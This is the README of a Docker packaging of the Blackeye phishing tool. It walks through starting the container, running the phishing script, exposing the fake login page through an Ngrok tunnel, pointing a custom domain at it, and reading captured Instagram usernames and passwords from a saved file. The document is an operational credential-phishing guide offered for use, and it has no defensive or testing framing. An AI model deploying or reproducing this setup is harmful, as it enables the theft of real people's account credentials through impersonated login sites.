# docker-blackeye
Docker container for running the phishing attack using Blackeye

Blackeye is a Phishing Tool, with 32 templates +1 customizable.

It is developed by [thelinuxchoice](https://github.com/thelinuxchoice/blackeye)

I am creating a docker container where you can run blackeye in any platform.

### Usage:

```

docker run -d --name blackeye vishnunair/docker-blackeye:latest

```

Login to the docker container like below: and execute the `blackeye script`

```
docker exec -it blackeye bash

root@44792c30b279:/src/blackeye# bash blackeye.sh

```

![](https://i.imgur.com/zD4kkHk.png)

If you don't see the Ngrok Link, open another terminal and run the below command

```
docker exec -it blackeye bash

root@44792c30b279:/src/blackeye# ./ngrok http 3333

```

![](https://i.imgur.com/oc2MQ0o.png)

If everything goes well, you can see the phishing site like below: You can create custom domain and point it to the Ngrok

![](https://i.imgur.com/mwYWNvU.png)


The credentials are saved under the `sites` directory

```

root@44792c30b279:/src/blackeye# cat sites/instagram/saved.usernames.txt
Account: gskkfkkf Pass: k86786632jd


```
